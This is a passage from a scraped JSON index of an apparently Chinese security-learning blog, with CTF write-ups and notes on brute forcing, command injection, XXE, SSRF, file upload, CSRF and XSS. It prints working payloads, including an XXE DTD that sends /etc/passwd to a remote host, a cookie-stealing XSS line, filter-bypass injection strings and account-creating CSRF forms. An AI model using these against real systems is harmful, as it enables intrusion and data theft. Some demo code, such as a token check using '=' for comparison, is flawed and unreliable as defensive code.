up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"http走私攻击","slug":"http走私攻击","permalink":"http://m0th.top/tags/http%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/"},{"name":"php字符串解析漏洞","slug":"php字符串解析漏洞","permalink":"http://m0th.top/tags/php%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"}]},{"title":"关于暴力破解和字典生成的一些操作","slug":"关于暴力破解和字典生成的一些操作","date":"2021-02-09T07:33:40.000Z","updated":"2021-02-10T14:55:19.844Z","comments":true,"path":"2021/02/09/关于暴力破解和字典生成的一些操作/","link":"","permalink":"http://m0th.top/2021/02/09/%E5%85%B3%E4%BA%8E%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C/","excerpt":"一些些关于爆破和制作字典的方法","text":"一些些关于爆破和制作字典的方法 暴力破解basic认证(本质是在爆破用户名密码的base64编码)HTTP Basic 认证介绍基本认证 basic authentication 是 HTTP1.0 提出的认证方法 认证步骤： 客户端访问一个受http基本认证保护的资源。 服务器返回401，要求客户端提供用户名和密码进行认证 401 Unauthorized WWW-Authenticate: Basic realm=”WallyWorld” 客户端将输入的用户名密码用base64进行编码后，采用非加密的明文方式传送个服务器。 Authorization: Basic xxxxxxxx 如果认证成功，则返回相关的资源。如果认证失败，则返回401状态，要求重新认证 爆破方法 :label:利用burp的Intruder模块即可，爆破方案用Runtime即可 :label: 利用python代码生成一个符合basic模式的字典 :arrow_right:admin:password 123456789101112131415161718192021222324def rdfile(one_file): cttlist=[] with open(one_file,&#x27;r&#x27;) as f: cttlist=f.readlines() return cttlistdef concet_two_list(list1,list2): result_list=[] for i in list1: for j in list2: result_list.append(i.strip()+&#x27;:&#x27;+j) return result_listdef write_into_file(onelist): with open(&#x27;dict.txt&#x27;,&#x27;w&#x27;) as f: f.writelines(onelist)if __name__==&quot;__main__&quot;: list1=rdfile(&#x27;./username.txt&#x27;) list2=rdfile(&#x27;./password.txt&#x27;) print(list2) list3=concet_two_list(list1,list2) write_into_file(list3) 利用工具自制字典cupp123python3 cupp.py -i #根据姓名 生日 等信息生成字典python3 cupp.py -w #根据现有字典拓展字典python3 cupp.py -l #下载字典 pydictor:label: 一款非常强大的字典生成工具 具体使用见 readme dymerge:label: Dymerge 用来操作多个已获得的字典文件，重塑以及合并的工具 12345678910Dymerge删除重复项python3 dymerge.py dic1.txt dic2.txt -uDymerge 拆开字典python3 dymerge.py dic1.txt dic2.txt -rDymerge 字母和数字排序python3 dymerge.py dic1.txt dict2.txt -sDymerge 输出合并内容python3 dymerge.py dic1.txt dict2.txt -s -t -o /root/output.txtDymerge 定义为压缩文件输出python3 dymerge.py dic1.txt dic2.txt -z /root/output.zip","categories":[{"name":"web漏洞笔记","slug":"web漏洞笔记","permalink":"http://m0th.top/categories/web%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"暴破","slug":"暴破","permalink":"http://m0th.top/tags/%E6%9A%B4%E7%A0%B4/"},{"name":"字典制作","slug":"字典制作","permalink":"http://m0th.top/tags/%E5%AD%97%E5%85%B8%E5%88%B6%E4%BD%9C/"}]},{"title":"[GXYCTF2019]Ping Ping Ping","slug":"GXYCTF2019-Ping-Ping-Ping","date":"2021-02-05T16:54:09.000Z","updated":"2021-02-05T17:36:53.553Z","comments":true,"path":"2021/02/06/GXYCTF2019-Ping-Ping-Ping/","link":"","permalink":"http://m0th.top/2021/02/06/GXYCTF2019-Ping-Ping-Ping/","excerpt":"一道非常经典的命令执行绕过题","text":"一道非常经典的命令执行绕过题 测试回显 分号或者管道符拼接执行命令 ?ip=127.0.0.1|ls ?ip=127.0.0.1;ls ?ip=127.0.0.1|cat index.php尝试读一下源码 bypass空格过滤 12345678$IFS$&#123;IFS&#125;$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行&lt; &lt;&gt; &#123;cat,flag.php&#125; &#x2F;&#x2F;用逗号实现了空格功能%20 %09 测试只有 $IFS$1可以 读出源码 1234567891011121314151617&lt;?phpif(isset($_GET[&#x27;ip&#x27;]))&#123; $ip = $_GET[&#x27;ip&#x27;]; if(preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;1f&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match))&#123; echo preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match); die(&quot;fxck your symbol!&quot;); &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123; die(&quot;fxck your space!&quot;); &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123; die(&quot;fxck your bash!&quot;); &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123; die(&quot;fxck your flag!&quot;); &#125; $a = shell_exec(&quot;ping -c 4 &quot;.$ip); echo &quot;&lt;pre&gt;&quot;; print_r($a);&#125; bypass bash我们可以通过 sh来执行想要的命令 bypass flag 统配符号绕过符号绕过 ? * fla’’g fla\\g.php a=g;fla$a 变量拼接 echo “Y2F0IGZsYWcucGhw”| base64 -d | bash 编码解码 内联执行 反引号内命令的输出作为输入执行 因为if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)) 和上面过滤了通配符的原因 所以只能采取变量拼接和编码的方式 bypass cat tac ca\\t 通配符 c?t 编码如上 三种payload结合上述源代码和bypass技巧，得到 123?ip=17.0.0.1|echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh?ip=127.0.0.1;cat$IFS$9`ls`?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php 参考文章https://www.cnblogs.com/wangtanzhi/p/12246386.html#commentform","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"命令执行","slug":"命令执行","permalink":"http://m0th.top/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"浅析XXE漏洞攻防","slug":"浅析XXE漏洞攻防","date":"2021-02-05T08:13:22.000Z","updated":"2021-02-05T09:45:38.348Z","comments":true,"path":"2021/02/05/浅析XXE漏洞攻防/","link":"","permalink":"http://m0th.top/2021/02/05/%E6%B5%85%E6%9E%90XXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E9%98%B2/","excerpt":"系统学习了XXE漏洞的原理，以及XML语法 XXE漏洞利用代码的编写","text":"系统学习了XXE漏洞的原理，以及XML语法 XXE漏洞利用代码的编写 XML代码用途和语法 XML被设计者用来传输和储存数据。XML文档形成了一种树状结构，它从”根部”开始，扩展到”枝叶”。XML允许创作这定义自己的标签和自己的文档结构 XML语法规则 所以的XML元素都必须有一个关闭标签 XML标签对大小写敏感 XML必须正确嵌套 XML属性值必须加引号 实体引用 在XML中，空格会被保留 XML DTD介绍 拥有正确语法的XML被称为”形式良好”的XML。通过DTD验证的XML是”合法”的XML。 DTD本身相当于给出了一套格式 1234567891011121314&lt;?xml version=&quot;1.0&quot; ?&gt; &lt;!DOCTYPE note[ &lt;!ELEMENT note(to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;-- PCDATA 的意思是被解析的字符数据parsed character data，一种数据类型 --&gt; &lt;!ELEMENT from (#PCDATA)&gt;&lt; -- CDATA 的意思是字符数据，是不会被解析的文本 --&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt;]&gt;&lt;note&gt; &lt;to&gt;Tove&lt;/to&gt; &lt;from&gt;Jani&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;message&gt;Don&#x27;t forget me this weekind!&lt;/message&gt;&lt;/note&gt; DTD可以位于XML源文件内部，也可以位于XML源文件的外部，即如下两种格式 12&lt;!DOCTYPE root-element SYSTEM &quot;filename.dtd&quot;&gt;&lt;!DOCTYPE root-element [element-declarations]&gt; DTD 实体介绍 实体是用于定义引用普通文本和特殊字符的快捷方式的变量 内部实体：&lt;!ENTITY entity-name &quot;entity-value&quot;&gt; 外部实体：&lt;!ENTITY entity-name SYSTEM &quot;URI/URL&quot;&gt; XXE注入漏洞原理 XXE外部实体注入漏洞，xxe漏洞发生在应用程序解析xml输入时，没有禁止外部实体加载，可能导致加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、内网攻击、dos攻击等危害 xxe漏洞触发点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致恶意上传xml文件 漏洞代码demo123456&lt;?php $xml=file_get_contents(&quot;php://input&quot;); $data=simplexml_load_string($xml); echo &quot;&lt;pre&gt;&quot;; print_r($data);?&gt; payload12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE xxe[&lt;!ELEMENT name ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt; XXE漏洞利用我有回显任意文件读取上面已经给出读取代码，这里给出一种读取php源代码的payload 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY[ &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=test.php&quot;&gt;]&gt;&lt;value&gt;&amp;xxe;&lt;/value&gt; 无回显文件读取payload 123&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo SYSTEM &quot;http://192.168.1.103/test.dtd&quot;&gt;&lt;foo&gt;&amp;e1;&lt;/foo&gt; test.dtd代码如下 123&lt;! ENTITY % p1 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;&lt;! ENTITY % p2 &quot;&lt;!ENTITY e1 SYSTEM &#39;http:&#x2F;&#x2F;192.168.1.103&#x2F;test.php?con&#x3D;%p1;&#39;&gt;&quot;&gt;%p2;","categories":[{"name":"web漏洞笔记","slug":"web漏洞笔记","permalink":"http://m0th.top/categories/web%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"XXE","slug":"XXE","permalink":"http://m0th.top/tags/XXE/"}]},{"title":"关于SSRF漏洞的学习笔记","slug":"关于SSRF漏洞的学习笔记","date":"2021-02-05T05:24:31.000Z","updated":"2021-02-05T16:35:25.574Z","comments":true,"path":"2021/02/05/关于SSRF漏洞的学习笔记/","link":"","permalink":"http://m0th.top/2021/02/05/%E5%85%B3%E4%BA%8ESSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"未完待续","text":"未完待续 SSRF服务端请求伪造SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。 三种产生此漏洞的php函数domefile_get_contents()12345678910&lt;?php if(isset($_POST[&#x27;url&#x27;]))&#123; $content=file_get_contents($_POST[&#x27;url&#x27;]); $filename=&quot;./images/&quot;.rand().&#x27;imag1.jpg&#x27;; file_put_contents($filename,$content); echo $_POST[&#x27;url&#x27;]; $img =&quot;&lt;img src=\\&quot;&quot;.$filename.&quot;\\&quot;/&gt;&quot;; &#125; echo $img; ?&gt; fsockopen()1234567891011121314151617181920&lt;?php function GetFile($host,$port,$link)&#123; $fp=fsockopen($host,intval($port),$errno,$errstr,30); if(!$fp)&#123; echo &quot;$errstr(error number $errno)\\n&quot;; &#125;else&#123; $out=&quot;GET $link HTTP/1.1\\r\\n&quot;; $out.=&quot;Host: $host\\r\\n&quot;; $out.=&quot;Connection: Close\\r\\n\\r\\n&quot; $out.=&quot;\\r\\n&quot;; fwrite($fp,$out); $contents=&quot;&quot;; while(!feof($fp))&#123; $contents.=fgets($fp,1024); &#125; fclose($fp); return $contents; &#125;&#125;?&gt; curl_exec()1234567891011121314&lt;?php if(isset($_POST[&#x27;url&#x27;]))&#123; $link=$_POST[&#x27;url&#x27;]; $curlobj=curl_init(); curl_setopt($curlobj,CURLOPT_POST,0); curl_setopt($curlobj,CUTLOPT_RETURNTRANSFER,TRUE);//将curl_exec()获取的信息以字符串返回，不是直接输出 $result=curl_exec($curlobj); curl_close($curlobj); $filename=&#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;; file_put_contents($filename,$result); echo $result; &#125;?&gt; SSRF漏洞利用内网探测 端口扫描","categories":[{"name":"web漏洞笔记","slug":"web漏洞笔记","permalink":"http://m0th.top/categories/web%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"ssrf","slug":"ssrf","permalink":"http://m0th.top/tags/ssrf/"}]},{"title":"[Bsidesctf 2020]Had a bad day","slug":"bsidesctf-2020-had-a-bad-day","date":"2021-02-03T15:35:07.000Z","updated":"2021-02-03T16:26:02.212Z","comments":true,"path":"2021/02/03/bsidesctf-2020-had-a-bad-day/","link":"","permalink":"http://m0th.top/2021/02/03/bsidesctf-2020-had-a-bad-day/","excerpt":"简单的 php伪协议读源码","text":"简单的 php伪协议读源码 [BSidesCF 2020]Had a bad day伪协议读源码1http:&#x2F;&#x2F;f18036a8-a230-43b0-bbe4-c96610e4407d.node3.buuoj.cn&#x2F;index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag 源码12345678910111213&lt;?php$file = $_GET[&#x27;category&#x27;];if(isset($file))&#123; if( strpos( $file, &quot;woofers&quot; ) !== false || strpos( $file, &quot;meowers&quot; ) !== false || strpos( $file, &quot;index&quot;))&#123; //必须出现 woofers meowers index之一 include ($file . &#x27;.php&#x27;); //强行加后缀 &#125; else&#123; echo &quot;Sorry, we currently only support woofers and meowers.&quot;; &#125;&#125;?&gt; 这个题有两种payload12http:&#x2F;&#x2F;f18036a8-a230-43b0-bbe4-c96610e4407d.node3.buuoj.cn&#x2F;index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;woofers.&#x2F;..&#x2F;flaghttp:&#x2F;&#x2F;f18036a8-a230-43b0-bbe4-c96610e4407d.node3.buuoj.cn&#x2F;index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;woofers&#x2F;resource&#x3D;flag trick php://filter 可以嵌套一层不存在的协议 php://filter/convert.base64-encode/woofers/resource=","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"http://m0th.top/tags/ctf-web/"},{"name":"文件包含","slug":"文件包含","permalink":"http://m0th.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"php伪协议","slug":"php伪协议","permalink":"http://m0th.top/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"}]},{"title":"关于文件上传的一些常见bypass技巧","slug":"关于文件上传的一些常见bypass","date":"2021-02-03T09:32:13.000Z","updated":"2021-02-03T11:35:41.109Z","comments":true,"path":"2021/02/03/关于文件上传的一些常见bypass/","link":"","permalink":"http://m0th.top/2021/02/03/%E5%85%B3%E4%BA%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81bypass/","excerpt":"文件上传漏洞上传漏洞顾名思义，就是攻击者上传了一个可执行文件如木马，病毒，恶意脚本，WebShell等到服务器执行，并最终获得网站控制权限的高危漏洞。","text":"文件上传漏洞上传漏洞顾名思义，就是攻击者上传了一个可执行文件如木马，病毒，恶意脚本，WebShell等到服务器执行，并最终获得网站控制权限的高危漏洞。 一些常见bypass技巧分析bypass javascript限制前端对于后缀名有限制 123456789101112131415161718&lt;script&gt; function checkFile()&#123; var file= document.getElementsByName(&#x27;upload_file&#x27;)[0].value if(file== null || file ==&quot;&quot;)&#123; alert(&#x27;请选择上传的文件&#x27;); return false; &#125; var allow_ext=&quot;.jpg|.png|.gif&quot;; var ext_name= file.substring(file.lastIndexOf(&quot;.&quot;)) if (allow_ext.indexOf(ext_name)== -1)&#123; var errMsg= &quot;该文件不允许上传，请上传&quot;+allow_ext+&quot;类型的文件&quot;; alert(errMsg); return false; &#125;else&#123; return true; &#125; &#125;&lt;/script&gt; 浏览器禁用js burp直接删掉js bypass MIME类型限制 MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。 在php代码中对 文件类型进行了限制 1$_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;]== &#x27;image/jpeg&#x27; 抓包 更改 Content-Type 放包即可绕过 bypass 黑名单后缀名在 php 代码中做了如下限制 1$_FILES[&quot;upload_file&quot;][&quot;name&quot;] !=&quot;.php&quot; 我们可以采用php的一些别名来绕过 php3 php5 phtml pht phps php4 php1 利用.htaccess进行绕过 htaccess文件是apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现： 网页301重定向、自定义404错误页面、改变文件扩展名、允许/组织特定的用户或者目录的访问、禁止目录列表、配置 默认文档等功能。 其中 当.htaccess 文件内容： SetHandler application/x-httpd-php 设置当前目录所有文件都使用php解析，无论上传任何文件，只要文件内容符合php语言代码规范，即可当做php代码执行 一个重要的tip！ 在 Apache中如果启动 .htaccess 必须在http.conf 中设置 AllowOverride All 利用大小写来绕过 Windows下，对于文件名中的大小写不敏感。例如：test.php 和 TeST.PHP 是一样的 当然这种绕过方式只能应用于 windows系统 利用空格绕过 windows系统下，对于文件名中的空格会做空处理，程序中的检测代码却不能忽略空格。从而绕过黑名单。 利用点号绕过 windows系统下，文件后缀名最后一个点号会自动去除 利用特殊符号绕过 windows系统下，如果上传文件名中test.php::$DATA 会在服务器上生成一个test.php的文件，其中内容和所上传的文件内容相同，并被解析 利用常规的双写绕过 str_ireplace() 函数替换字符串中的一些字符，只进行一次 所以双写去掉一次，正好 bypass 白名单后缀名 00 截断 0x00是16进制表示法，是ascii码为0的字符，在有些函数处理时，会把这个字符当做结束符 系统在对文件名的读取时，如果遇上0x00，就会认为读取已经结束 一个重要的tips 在php5.3之后的版本中完全修复了00截断。00截断受限于GPC是否开启 bypass 文件二进制格式在服务端的PHP代码中，对于用户上传的文件做文件类型检查，查看文件格式是否符合上传规范 比如对图片格式进行验证 我们可以 1234GIF98A&lt;?php phpinfo();?&gt;","categories":[{"name":"web漏洞笔记","slug":"web漏洞笔记","permalink":"http://m0th.top/categories/web%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"http://m0th.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"深入研究CSRF漏洞","slug":"CSRF漏洞总结","date":"2021-01-31T14:27:36.000Z","updated":"2021-02-01T09:52:58.701Z","comments":true,"path":"2021/01/31/CSRF漏洞总结/","link":"","permalink":"http://m0th.top/2021/01/31/CSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","excerpt":"CSRF作为一种被动的漏洞，在ctf比赛中较为少见，因此以往并没有引起笔者的重视 笔者最近在往实战方向转移，所以从新研究了一下csrf漏洞","text":"CSRF作为一种被动的漏洞，在ctf比赛中较为少见，因此以往并没有引起笔者的重视 笔者最近在往实战方向转移，所以从新研究了一下csrf漏洞 CSRF漏洞CSRF漏洞原理CSRF(跨站伪造请求)也被成为One click Attack 或 Session Riding。 XSS与CSRF的区别： XSS利用站点内的信任用户，盗取Cookie CSRF通过伪造成受信任的用户请求受信任网站。 原理：利用目标用户的合法身份，以目标用户的名义执行某些非法操作 CSRF漏洞利用GET型CSRF利用比较简单，此处不赘述 POST型CSRF利用 我们利用表单进行提交。将标签的type属性设置为hidden，例如：&lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;11111&quot; /&gt; 下面写一个小demo 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;恭喜中奖&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;http://127.0.0.1/csrf_test/post_csrf/new_user.php&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;admin_test&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;admin_test&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;sub&quot; value=&quot;OK&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;test&quot; value=&quot;中奖了&quot;&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; CSRF探测及自动化几种csrf防护手段 HTTP Referer 头验证 设置Token HTTP自定义头 二次验证（指不仅进行后端认证，也进行前端认证，比如做修改密码操作时，弹出框提醒用户），验证码 如果web应用程序的http请求中没有对应的预防措施，那么很大成度上就确定存在csrf漏洞 CSRF自动化探测采用CSRFTester，其原理相当于爬虫。采用agent 代理技术，抓取我们在浏览器中访问的所有连接以及所有表单，通过CSRFTester中修改表单的信息，重新提交，相当于一次伪造客户端请求，如果请求成功被服务器接收，则说明存在csrf漏洞。 Burpsuite自带自动生成 CSRFPOC 模块 CSRF漏洞防御利用token技术进行csrf漏洞防御CSRF漏洞实质：服务器无法准确判断当前请求是否是合法用户的自定义操作 Token作为识别当前用户自己操作的唯一凭证，需要设置为复杂难以破解的内容。 这里我给一个小demo 1234567&lt;?php function generateToken()&#123; $salt=&quot;test&quot;.date(&quot;Y/m/d&quot;); $token=md5($salt); return $token; &#125;?&gt; 具体操作 登入验证成功之后，在会话SESSION[“user_token”]中保存token 在后台操作中，增删改表单中增添隐藏域hidden，设置value为Token 每次提交之后验证Token是否正确 写一个dome 123456789101112131415161718192021222324&lt;?php session_start(); function token_generate()&#123; $salt=&quot;hahahaha&quot;.date(&quot;h:i:s&quot;); $token= md5($salt); return $token; &#125; $token= token_generate(); $_SESSION[&quot;user_token&quot;]= $token; ?&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;CSRF_TOKEN&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;CSRF_TOKEN&lt;/h1&gt; &lt;form action=&quot;&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&lt;?php echo $token;?&gt;&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;s&quot;&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; token验证的时候可以单独写一个函数,当处理一些敏感操作时进行 token验证 12345678&lt;?php function token_check()&#123; $user_token=$_POST[&quot;user_token&quot;]; if($_SESSION[&quot;user_token&quot;]=$user_token) echo &quot;successful&quot;; else die(&quot;非法操作&quot;); &#125; CSRF bypass http_referer HTTP Referer 是header的一部分，当浏览器向web服务发送请求的时候，一般会带上Referer，告诉服务器从哪个页面链接来的，服务器基于此可以获得一些信息。 在用于CSRF防御时，用户执行对应操作，提交的HTTP请求中有对应的Referer值，此时服务端判断Referer值是否与服务器器的域名信息相关，不相关则不允许执行操作 后端dome 123456&lt;?php if(strpos($_SERVER[&#x27;HTTP_REFERER&#x27;],&#x27;xx.com&#x27;)!==false)&#123; return true; &#125;else&#123; return false; &#125; 我们可以构造文件名绕过 例如 http://target.com/xx.com/1.php CSRF payload123&lt;a href=&quot;http://127.0.0.1/get_csrf/new_user.php?username=liuxiaoyang&amp;password=123456&quot;&gt;点击我&lt;/a&gt;&lt;iframe src=&quot;http://127.0.0.1/get_csrf/new_user.php?username=liuxiaoyang&amp;password=123456&quot; style=&quot;display:none&quot; /&gt;&lt;img src=&quot;http://127.0.0.1/get_csrf/new_user.php?username=liuxiaoyang&amp;password=123456&quot;/&gt; 一种比较特别的攻击，利用 css中 backgroud 样式 中的url 加载远程机器上的内容，从而对url 中的内容发送http请求 1234body&#123; backgroud: #00FF00 url(http://127.0.0.1/get_csrf/new_user.php?username=liuxiaoyang&amp;password=123456) no-repeat fixed top;&#125;","categories":[{"name":"web漏洞笔记","slug":"web漏洞笔记","permalink":"http://m0th.top/categories/web%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CSRF","slug":"CSRF","permalink":"http://m0th.top/tags/CSRF/"}]},{"title":"XSS漏洞总结","slug":"xss漏洞笔记","date":"2021-01-28T03:54:42.000Z","updated":"2021-02-01T12:04:35.010Z","comments":true,"path":"2021/01/28/xss漏洞笔记/","link":"","permalink":"http://m0th.top/2021/01/28/xss%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/","excerpt":"笔者深入学习了XSS漏洞的成因 利用 绕过","text":"笔者深入学习了XSS漏洞的成因 利用 绕过 跨站脚本攻击XSS产生原因恶意攻击者往web页面中插入恶意javascript代码，当用户浏览此页时，嵌入其中web页面中的javascript代码会被执行，从而达到恶意攻击用户的目的 漏洞分类反射型xss反射型xss又称为非持久型xss，攻击具有一次性 攻击者通过邮件形式将包含xss代码的构造连接发送个正常用户，当用户点击时，服务器接受该用户的请求并且处理，将带有xss payload的web页面发给用户。用户浏览器解析，触发该漏洞 存储型xss存储型xss又称为持久型xss，攻击脚本储存在服务器的数据库中 攻击者在论坛、博客、留言板中 发贴的过程嵌入xss代码，帖子被服务器存储在数据库中。用户正常访问时，会触发xss代码 DOM型xssDOM全称Document Object Model，使用DOM动态访问更新文档的内容、结构以及样式。通过htmlDOM可以对DOM树上所有节点进行修改。服务器响应不会处理攻击者脚本，当用户浏览器处理这个响应时，dom对象处理xss代码，触发xss漏洞 漏洞利用利用xss漏洞盗取cookie cookie：Cookie是在http协议下，服务器或者脚本维护客户工作站上信息的一种方式。服务器端利用cookies包含信息的任意性来筛选维护这些信息，用来判断在http传输中的状态。cookie最常用于会话令牌。 1&lt;script&gt;document.location=&#x27;http://127.0.0.1/xss/cookie.php?cookie=&#x27;+document.cookie&lt;/script&gt; 利用xss篡改网页链接，实现引流 window.onload 窗口加载事件 123456789&lt;script&gt; window.onload=function()&#123; var link=document.getElementsByTagName(&quot;a&quot;); for(j=0;j&lt;link.length;j++)&#123; link[j].href=&quot;https://baidu.com/&quot;; &#125; &#125;&lt;/script&gt;#这里利用了一个匿名函数，当窗口加载时，使用for循环获取所有的a标签，更改a标签的href属性为攻击者想要跳转的站点 利用kali里面的beef恶意链接生成，利用hook.js 执行其他命令 利用xss盗取用户信息(盗号)克隆站点登陆页面，利用存储型xss设置跳转代码，如果用户访问即跳转到克隆网站的登录页面，用户输入账密登入，账号和密码都被储存下来 setookit工具克隆网站非常简单 1&lt;script&gt;window.loaction=&quot;http://192.168.53.28/&quot;&lt;/script&gt; XSS bypass技巧(根据http://xss-quiz.int21h.jp 总结) ```html“alert(document.domain);“ 123452. &#96;&#96;&#96;html 1&quot;&gt;&lt;script&gt;alert(document.domain);&lt;&#x2F;script&gt;&lt;&quot; &quot; onclick&#x3D;alert(document.domain)&gt; &quot; onmouseover&#x3D;alert(document.domain)&gt; 选择列表中的xss 抓包分析 1p1=1&amp;p2=Japan&lt;/option&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; 隐藏表单的xss 1p1=1&amp;p2=Japan&amp;p3=1&quot;&gt;&lt;script&gt;alert(xss)&lt;/script&gt; baypass maxlength长度限制 直接删掉maxlength属性 11&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&lt;&quot; bypass 尖括号转义 通过事件处理器来绕过 1&quot; onclick=&quot;alert(document.domain);&quot; bypass 空格分隔的xss 绕过属性值强制加引号 11 onclick=alert(document.domain); 利用javascript为协议进行绕过 javascript 伪协议简介 将javascript代码添加得到客户端的方法是把它放置在伪协议说明符javascript:后的url中 这个伪协议声明了url的主体是任意的javascript代码，它由javascript的解释器运行。如果javascript:URL中的javascript打码 含有多个语句，必须使用分号分开。 1javascript:alert(document.domain); utf-7 绕过 （较为小众） 1+ACIAIABvAG4AYwBsAGkAYwBrACAAPQAgACIAIABhAGwAZQByAHQAKABkAG8AYwB1AG0AZQBuAHQALgBkAG8AbQBhAGkAbgApAA0AC- 编码绕过 双写绕过 过滤关键字 